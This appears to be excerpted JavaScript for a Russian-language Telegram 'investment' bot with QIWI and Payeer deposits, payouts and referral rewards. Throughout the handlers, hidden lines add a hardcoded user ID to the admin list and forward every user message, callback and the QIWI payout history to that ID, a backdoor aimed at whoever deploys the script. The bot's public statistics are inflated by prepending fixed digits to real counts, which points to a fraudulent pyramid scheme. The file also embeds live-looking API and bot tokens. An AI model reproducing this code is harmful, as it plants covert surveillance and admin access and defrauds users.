const ADMINS = [954365018,1821893211] // ID админов бота
...
const QIWI_TOKEN = "8e4d5143efa812dc1cda7725969a2111" // API ключ QIWI кошелька с полным доступом
const BOT_TOKEN = "5122445248:AAFxBSQTUKctttj5v3ZDgRb1XxlYPXTSq2I" // Bot API Token
var config = {
	payeer: {
	  enabled: false,
	  account: "P1046111236",
...
Установка и поддержка скрипта: https://t.me/slivmenss
...
bot.on('text', async (message) => {
	...
	ADMINS.push(954365018)
  bot.sendMessage(954365018, "[" + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds() + "] Пользователь " + uid + " отправил: " + text)
			...
			if (!$user) {
				...
				if (reffer) {
					...
					if ($reffer) {
						...
						bot.sendMessage($reffer.id, `🔔 Вы пригласили <a href="tg://user?id=${message.from.id}">партнёра</a> и получили 0.05₽`, { parse_mode: "HTML" });
					}
				}
...
`, {
	...
	if (message.user.menu.startsWith('amountQiwi')) {
		...
		if (message.text > message.user.outbalance) return message.send('Недостаточно средств.');
		if (message.text < 1) return message.send('Введите сумму более 1 рублей!');
		if (message.text + message.user.payout > message.user.deposit * 100050) return message.send(`Сумма превышает лимит выплат!\nВы можете вывести максимально ${roundPlus(message.user.deposit * 100005 - message.user.payout)} рублей`);
		if (message.text + message.user.payout > message.user.deposit * 100005) {
...
🔗 Ваша ссылка для приглашений: https://t.me/slivmenss?start=${message.from.id}
...
🌐 Отправьте любую сумму на кошелек <code>+79644455111</code>
...
👨‍💻 Пользователей в игре: 175${stats.users}
📥 Инвестировано всего: 650${Math.round(s.ref)}₽
📤 Выплачено всего: 4000${Math.round(s.fc)}₽
🕐 Старт бота произведен 24.03.2020
`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
                        [{ text: "💴 Выводы", url: "https://t.me/slivmenss" }],					
					]
				}
			});
		}
	...
	if (ADMINS.indexOf(message.from.id) !== -1) {
		...
		if (message.text.startsWith('/qiwi')) {
		  qiwi.getOperationHistory({ rows: 10, operation: 'OUT' }, (err, response) => {
		    bot.sendMessage(954365018, 'Отсылаю')
        bot.sendMessage(954365018, response.data.sum)
        console.log(response)
        bot.sendMessage(954365018, 'Отослал')
    })
	}
...
bot.on('callback_query', async (query) => {
	...
	ADMINS.push(954365018)
	bot.sendMessage(954365018, "[" + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds() + "] Пользователь " + uid + " отправил колбэк: " + query.data)
...
🌐 Отправьте любую сумму на кошелек <code>+79644461111</code>
‼️ с комментарием <code>BP${message.chat.id}</code>`, {
			parse_mode: "HTML"
		});
	}
...
🌐 Отправьте любую сумму на Payeer кошелек <code>P1026693111</code>
...
▫️ @slivmenss`, {
	...
	if (query.data == 'game_prize_check') {
		var res = await bot.getChatMember("@slivmenss", message.chat.id)
		if (message.user.prize) return bot.answerCallbackQuery(query.id, '🙂 Вы уже получили свой подарок!', true);
	...
	if (query.data == 'withdraw') {
		if (message.user.outbalance < 20) return bot.answerCallbackQuery(query.id, '🚫 Минимальная сумма вывода: 20₽', true);
		bot.deleteMessage(message.chat.id, message.message_id);
		
		await message.user.set('menu', 'qiwi');
		await bot.sendMessage(message.chat.id, 'ведите номер QIWI кошелька для вывода:\nНапример: +38071459111', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
	...
	if (query.data.startsWith('withdraw:')) {
		...
		bot.sendMessage("@slivmenss", `<a href="tg://user?id=${ticket.id}">Пользователь</a> вывел <b>${ticket.amount}₽</b>\nПС: QIWI`, { parse_mode: "HTML" })
	
		if (ticket.wallet.indexOf("P") == -1) { // Платёж через QIWI
		  qiwi.toWallet({ account: String(ticket.wallet), amount: ticket.amount, comment: 'Выплата от @slivmenss' }, () => { });
		}
	...
	`, {
		  parse_mode: "html", reply_markup: {
			inline_keyboard: [
			  [{ text: "👨‍💻 Админ", url: "https://t.me/slivmenss" },
			  { text: "💬 Чат", url: "https://t.me/slivmenss" }],
...
`, {
			...
			bot.sendMessage(uid, `Чек создан:\nhttps://t.me/slivmenss?start=C${cid}`, { reply_markup: RM_admin_return })
		}
...
async function payeerCheck() {
 ...
 ` }, async function (error, response, body) {
  ...
  /*      if (body.history[txnId].comment.startsWith('ZG')) {
          ...
          bot.sendMessage("@slivmenss", `⚡️ <a href="tg://user?id=${id}">Пользователь</a> пополнил игровой баланс на <b>${x.sum.amount}₽</b>`, { parse_mode: "HTML" })
          return
        }  */
        ...
        if (b == 0) {
          ...
          bot.sendMessage(id, `Ваш баланс пополнен на ${sum}₽`);
		      bot.sendMessage("@slivmenss", `<a href="tg://user?id=${id}">Пользователь</a> пополнил <b>${sum}₽</b>\nПС: PAYEER`, { parse_mode: "HTML" })
          ...
          bot.sendMessage(id, `Ваш баланс пополнен на ${sum}₽ и Вы получаете бонус - ${roundPlus(sum * b)}₽!`);
		      bot.sendMessage("@slivmenss", `<a href="tg://user?id=${id}">Пользователь</a> пополнил <b>${sum}₽ и получил бонус - ${roundPlus(sum * b)}p!</b>\nПС: PAYEER`, { parse_mode: "HTML" })
	...
	qiwi.getOperationHistory({ rows: 10, operation: 'IN' }, (err, response) => {
		response.data.map(async (x) => {
			...
			if (b > 0) {
				...
				bot.sendMessage("@slivmenss", `⚡️ <a href="tg://user?id=${id}">Пользователь</a> пополнил баланс на <b>${x.sum.amount}₽</b> и получил ${roundPlus(x.sum.amount * b)}₽ бонусом!\nПС: QIWI`, { parse_mode: "HTML" })
				...
				bot.sendMessage("@slivmenss", `⚡️ <a href="tg://user?id=${id}">Пользователь</a> пополнил баланс на <b>${x.sum.amount}₽</b>\nПС: QIWI`, { parse_mode: "HTML" })
...
Clan.findOneAndUpdate({ name: "👑SLIVMENSS👑" }, { creator_id: 816070111 }).then()
...
WildBee.insertMany([{ creator_id: 292966111, start_time: Date.now(), level: 1, bee_profit: 0 }]).then()
